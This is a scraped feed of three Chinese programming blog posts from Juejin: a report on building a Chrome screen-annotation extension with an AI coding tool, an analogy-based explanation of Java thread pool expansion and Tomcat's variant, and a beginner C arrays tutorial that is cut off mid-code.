<p>为响应百度文心快码（Comate）CCF 大会的号召，即在“最佳提效”、“最佳创意”等方向利用 AI 提速开发，我们选定了开发一款实用的屏幕标注扩展插件。该插件旨在为用户提供快速的网页标记能力，支持画笔、矩形、箭头以及可移动的文字标注等功能。本次开发的核心价值在于验证和展示 AI 工具在复杂应用开发，特别是 Chrome 扩展开发领域的加速能力。</p>
<h4 data-id="heading-2">二、 开发方法与 AI 加速实施（Methodology and Implementation）</h4>
<p>整个项目启动后，开发速度的关键依赖于文心快码的代码生成能力。</p>
<p><strong>1. 初始代码生成：</strong> 项目没有从零开始编写基础框架，而是直接向文心快码输入了一个简洁的核心提示词，要求其生成插件的框架和功能。</p>
<ul>
<li><strong>使用的提示词为：</strong> “你是一个谷歌扩展插件开发专家，开发一个屏幕标注的谷歌插件”。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ce327c86dd843eca802b4f08367ffdc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764429949&amp;x-signature=5gH16iMIiGoR0pJTOzZGqbQzUOE%3D" alt="截屏2025-11-22 23.11.24.png" loading="lazy"/>
文心快码在收到提示后，<strong>开发速度相当快</strong>，迅速完成了插件的初步开发。这使得开发者的主要工作重点从架构搭建和功能实现，转移到了后续的调试和优化上。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb4dbfac00ff4832a2fc0c7337183422~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764429949&amp;x-signature=8bZUATudiDUC3X92EreP9GilbOg%3D" alt="截屏2025-11-22 23.23.09.png" loading="lazy"/></p>
<p><strong>2. 开发者主要工作重心：</strong> 在 AI 完成初步开发后，开发过程的主要精力被投入到**修 bug（修正程序错误）**上，这一环节花费了主要的时间。此外，还涉及到插件图标的设计和制作。图标是使用“豆包”设计工具完成的，随后利用开发者此前开发的 <code>Smart Icon Converter</code> 工具完成了图标尺寸的制作。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fsmart-icon-converter.vercel.app%2F" target="_blank" title="https://smart-icon-converter.vercel.app/" ref="nofollow noopener noreferrer">smart-icon-converter.vercel.app/</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5357ac1e46fb4df1b076ad47849ca0d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764429949&amp;x-signature=YYoG4Vdv6kWH9eJgX2A3SJQyzrk%3D" alt="截屏2025-11-22 23.24.07.png" loading="lazy"/></p>
<h4 data-id="heading-3">三、 调试、问题与解决（Debugging, Problems, and Solutions）</h4>
<p>虽然 AI 实现了快速生成，但在实际应用和用户体验方面，仍需要人工介入解决一系列问题。</p>






























<table><thead><tr><th align="left">遇到的问题 (Problem)</th><th align="left">解决办法 (Solution)</th><th align="left">来源</th></tr></thead><tbody><tr><td align="left"><strong>P1：编码与乱码问题</strong></td><td align="left">初始生成的代码存在功能不可用的现象。</td><td align="left">进行了针对性的 <strong>bug 修复（修掉 bug）</strong> 。</td></tr><tr><td align="left"><strong>P2：界面本地化缺失</strong></td><td align="left">插件初始界面全部是<strong>英文的</strong>，没有中文支持。</td><td align="left">手动调整，使其完成中文标注的适配。</td></tr><tr><td align="left"><strong>P3：工具交互性不足</strong></td><td align="left">多个标注工具的细节存在缺陷，影响用户体验：a. 箭头尺寸过小。b. 画笔工具不是所需的方块形状。c. 文字标注完成后<strong>无法很好地移动</strong>。</td><td align="left">针对性地完成了修改，修复了箭头和画笔的尺寸和形状问题，并解决了文字标注的移动功能。</td></tr><tr><td align="left"><strong>P4：功能取舍与完成度</strong></td><td align="left">插件中的<strong>截屏功能一直未能很好地实现</strong>，影响了产品的整体完成度。</td><td align="left">为确保产品整体的<strong>完成度更强</strong>，决定将该未能良好实现的功能去除。</td></tr></tbody></table>
<h4 data-id="heading-4">四、 结论（Conclusion）</h4>
<p>通过本次屏幕标注 Chrome 扩展的开发实践，我们成功展示了文心快码在提升开发效率方面的巨大潜力。借助 AI 快速生成主体代码，开发人员得以将精力集中在解决细节、优化用户体验和修复具体 Bug 上，从而在**极短的时间内（约两天）**交付了一个功能完整的工具。这一过程有力地印证了“码力全开 AI 加速”的主题，并期望在本次征文中能争取到“最佳提效”的奖项。</p>
<p>项目最终实现了颜色选择、画笔、矩形、箭头和可移动文字标注等核心功能。</p>
<hr/>
<p><strong>类比总结：</strong></p>
<p>如果将传统的软件开发比作从零开始建造一座复杂的建筑，那么本次利用文心快码的 AI 加速开发过程，就像是 AI 快速提供了一个高度精密的预制框架。开发者无需在基础结构上耗费时间，而是可以立即跳到内饰装修、细节调整和解决结构小缺陷的环节，极大缩短了从概念到交付的周期。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[吃烤鱼时突然悟到的：为什么 Java 线程池的扩容逻辑是“反直觉”的？]]></title>    <link>https://juejin.cn/post/7575104251865726986</link>    <guid>https://juejin.cn/post/7575104251865726986</guid>    <pubDate>2025-11-22T14:00:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251865726986" data-draft-id="7575083657994076187" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="吃烤鱼时突然悟到的：为什么 Java 线程池的扩容逻辑是“反直觉”的？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-22T14:00:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="骑着bug的coder"/> <meta itemprop="url" content="https://juejin.cn/user/1922418579089566"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            吃烤鱼时突然悟到的：为什么 Java 线程池的扩容逻辑是“反直觉”的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1922418579089566/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    骑着bug的coder
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T14:00:13.000Z" title="Sat Nov 22 2025 14:00:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>今天去吃烤鱼，排队的时候我突然陷入了思考。</p>
<p>场景复现：这家店生意很火。</p>
<ol>
<li>店里原本有 10 张桌子（核心线程），全坐满了。</li>
<li>老板看到还有人来，立马把门口露天的 5 张折叠桌也支棱起来了（最大线程）。</li>
<li>折叠桌也坐满了，老板才开始发号，让大家在门口坐小板凳排队（队列）。</li>
<li>排队的人实在太多，老板只能出来挥手：“别排了，今天的鱼卖完了”（拒绝策略）。</li>
</ol>
<p>这逻辑很顺吧？<br/>
<strong>先尽全力接待（扩容），实在不行了再让人等（排队）。</strong></p>
<p>可我转念一想——</p>
<p><strong>Java 原生线程池（ThreadPoolExecutor）的逻辑怎么是反着来的？</strong></p>
<p>它的流程是：<br/>
<strong>核心线程满 → 进队列排队 → 队列满了才去扩容（创建最大线程）</strong></p>
<p>这就好比：店里 10 张桌子坐满了，老板不先支折叠桌，而是非要让客人在门口排队。<br/>
直到门口小板凳都坐不下了，才不情不愿地去支折叠桌。</p>
<p>这不是反人类吗？</p>
<p>回来后我翻了源码，终于想通了其中的博弈。</p>
<h2 data-id="heading-0">1. 核心矛盾：资源视角的差异</h2>
<p><strong>烤鱼店视角（IO 密集型 / 响应优先）</strong></p>
<ul>
<li>目标：赚钱，不让客人跑了</li>
<li>成本：折叠桌（线程）很便宜，客人等久了会走</li>
<li>策略：保响应，只要有空地，赶紧把桌子支起来，别让客人干等</li>
</ul>
<p><strong>Java JDK 视角（计算密集型 / 资源优先）</strong></p>
<ul>
<li>目标：保护 CPU，防止系统崩盘</li>
<li>成本：线程是昂贵资源
<ul>
<li>创建一个线程默认占 1MB 栈空间（栈）</li>
<li>线程太多，上下文切换会把 CPU 拖死</li>
</ul>
</li>
<li>队列是廉价资源：一个任务对象扔堆里，几乎不花钱</li>
<li>策略：省资源，只要核心线程能扛，就绝不轻易加人<br/>
“先让任务在内存里排会儿队吧，实在扛不住我再加人。”</li>
</ul>
<h2 data-id="heading-1">2. 破局：Tomcat 的“烤鱼流”线程池</h2>
<p>难道 Java 就不能像烤鱼店一样工作吗？</p>
<p><strong>能，而且 Tomcat/Jetty 就是这么干的。</strong></p>
<p>Web 请求是典型的 IO 密集型任务（读 DB、调接口，CPU 经常空闲）。<br/>
如果按 JDK 默认逻辑（先排队），用户在浏览器前就等到死。</p>
<p>Tomcat 的骚操作：</p>
<p>它继承了 ThreadPoolExecutor，但魔改了队列（TaskQueue）。</p>
<ul>
<li>核心线程满了，任务想入队时，队列会<strong>伪造“我已满”的假象</strong>（offer 返回 false）</li>
<li>线程池一听“队列满了”，立刻创建新线程（支折叠桌）</li>
<li>只有当线程数真的达到 maximumPoolSize，队列才会真正接收任务开始排队</li>
</ul>
<h2 data-id="heading-2">3. JDK 默认线程池的世纪大坑</h2>
<p>初学者喜欢这么写：</p>
<pre><code class="hljs language-java" lang="java">Executors.newFixedThreadPool(<span class="hljs-number">10</span>)
</code></pre>
<p>展开其实是：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ExecutorService <span class="hljs-title function_">newFixedThreadPool</span><span class="hljs-params">(<span class="hljs-type">int</span> nThreads)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(nThreads, nThreads,
                                  <span class="hljs-number">0L</span>, TimeUnit.MILLISECONDS,
                                  <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;()); <span class="hljs-comment">// ⚠️ 坑在这里</span>
}
</code></pre>
<p><strong>LinkedBlockingQueue 是无界队列（默认 Integer.MAX_VALUE）</strong></p>
<p>后果：</p>
<ol>
<li>队列永远装不满 → <code>maximumPoolSize</code> 参数直接失效（永远轮不到它出场）</li>
<li>任务处理不过来时，队列无限膨胀 → OOM → 服务直接挂掉</li>
</ol>
<p>这才是真正的生产事故之王。</p>
<h2 data-id="heading-3">4. 总结与避坑指南</h2>
<p><strong>两种逻辑对比：</strong></p>




















<table><thead><tr><th>场景</th><th>执行顺序</th><th>适用场景</th></tr></thead><tbody><tr><td>JDK 默认</td><td>核心 → 队列 → 最大 → 拒绝</td><td>后台计算任务、保护 CPU</td></tr><tr><td>烤鱼店/Tomcat</td><td>核心 → 最大 → 队列 → 拒绝</td><td>高并发 Web、追求低延迟</td></tr></tbody></table>
<p><strong>生产环境铁律：</strong></p>
<ol>
<li>禁止使用 <code>Executors</code> 的快捷方法创建线程池</li>
<li>必须手动 <code>new ThreadPoolExecutor(...)</code></li>
<li>必须用有界队列（推荐 <code>ArrayBlockingQueue</code>）</li>
<li>拒绝策略推荐 <code>CallerRunsPolicy</code>（让调用者线程自己干活，实现天然背压）</li>
</ol>
<p>下次你去吃烤鱼排队时，注意看老板是先支折叠桌，还是先让你们排队。</p>
<p>如果他先支折叠桌——<br/>
恭喜你，这老板懂高并发，比很多写 Java 的都强。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C语言：数组入门及其基础算法详解]]></title>    <link>https://juejin.cn/post/7575103881422078006</link>    <guid>https://juejin.cn/post/7575103881422078006</guid>    <pubDate>2025-11-22T15:36:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575103881422078006" data-draft-id="7575230119104036905" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C语言：数组入门及其基础算法详解"/> <meta itemprop="keywords" content="C语言"/> <meta itemprop="datePublished" content="2025-11-22T15:36:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户04354377195"/> <meta itemprop="url" content="https://juejin.cn/user/1118624308269680"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C语言：数组入门及其基础算法详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1118624308269680/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户04354377195
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T15:36:57.000Z" title="Sat Nov 22 2025 15:36:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">C语言：数组入门及其基础算法详解(๑•̀ㅂ•́)و✧</h2>
<blockquote>
<p>本篇文章我会用我的理解介绍什么是数组，以及数组的一些基础算法，包含顺序查找，寻找最大值/最小值，数据插入，数据删除，数据倒置，冒泡排序，选择排序，二分查找共八个算法讲解及示例。</p>
</blockquote>
<h3 data-id="heading-1">一.什么是数组?</h3>
<p>本篇文章的重点是算法详解，基本概念简单提一下。</p>
<h4 data-id="heading-2">定义</h4>
<p>你可以把数组想象成一个<strong>有很多个格子的储物柜</strong>，其有以下特性：</p>
<ul>
<li><strong>同一数据类型：</strong> 储物柜每个格子都只能存放<strong>同种类型</strong>的物品（比如全是书或者全是衣服），在编程中，即元素均为<strong>同种数据类型</strong>（全是整型int或全是字符型char)</li>
<li><strong>连续内存空间：</strong> 这些格子是一个接一个，连续排列的</li>
<li><strong>下标（索引）访问：</strong> 每个格子都有一个编号，我们称作下标或索引，且<strong>编号从0开始</strong></li>
</ul>
<h4 data-id="heading-3">表示</h4>
<p>基本格式：</p>
<ul>
<li>数组数据类型 数组名称[元素个数];</li>
<li>数组数据类型 数组名称[（元素个数）]={元素1，元素2...元素n};</li>
</ul>
<p>第二种形式下的元素个数可不写，系统会自动计算后面{}中的元素个数，若填写，此形式下的"元素个数"应≥n</p>
<p><strong>eg</strong>:int num[5] ={1,2,3,4,5};  其中，num[0] = 1;num[3] = 4；</p>
<h3 data-id="heading-4">常用基础算法(｡•̀ᴗ-)✧</h3>
<p>以下算法全部基于 int num[5] = {1,2,3,4,5};进行</p>
<h4 data-id="heading-5">1.顺序查找</h4>
<h5 data-id="heading-6">就像在一排房子里找人，从第一家开始问</h5>
<p>eg : 查找数组 num 中值为 4 的元素及其位置</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> num[<span class="hljs-number">5</span>] = {<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>};
    <span class="hljs-type">int</span> n = <span class="hljs-number">4</span>;<span class="hljs-comment">//要找的元素</span>
    <span class="hljs-type">int</span> found = <span class="hljs-number">0</span>;<span class="hljs-comment">//0表示没找到，1表示找到了，先假设没找到</span>
    
    <span class="hljs-type">int</span> i;
    <span class="hljs-comment">//从第一个开始逐个寻找（也称遍历数组）</span>
    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++){
    	<span class="hljs-keyword">if</span>(num[i]==n){ <span class="hljs-comment">//如果第i位数字等于n，代表找到</span>
    		found = <span class="hljs-number">1</span>;
    		<span class="hljs-keyword">break</span>;<span class="hljs-comment">//找到就停止循环</span>
		}
	}
	<span class="hljs-keyword">if</span>(found==<span class="hljs-number">1</span>){
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"找到了！%d在数组第%d位"</span>,n,i+<span class="hljs-number">1</span>); <span class="hljs-comment">//注意：数组从0开始计数，因此此处为i+1</span>
	}
	<span class="hljs-keyword">else</span>{
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"没找到！"</span>);
	}
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">//输出</span>
<span class="hljs-comment">//找到了！4在数组第4位</span>
</code></pre>
<h4 data-id="heading-7">2.寻找最大值/最小值</h4>
<h5 data-id="heading-8">就像选班长，先定下一个人，再跟其他人进行比较</h5>
<p>eg : 寻找并输出数组 num 中的最大值</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> num[<span class="hljs-number">5</span>] = {<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>};
    <span class="hljs-type">int</span> n = <span class="hljs-number">4</span>;
    <span class="hljs-type">int</span> max = num[<span class="hljs-number">0</span>];<span class="hljs-comment">//先假设最大值为num[0],即1</span>
    
    <span class="hljs-type">int</span> i;
    <span class="hljs-comment">//遍历数组</span>
    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">1</span>;i &lt; <span class="hljs-number">5</span>;i++){<span class="hljs-comment">//此处i从1开始，因为num[0]已经被假设为最大值，不需要再和自己比较一次</span>
    	<span class="hljs-keyword">if</span>(num[i]&gt;max){
    		max = num[i];<span class="hljs-comment">//找到更大的就更新</span>
		}
	}
<span class="hljs-built_in">printf</span>(<span class="hljs-string">"最大值为%d"</span>,max);
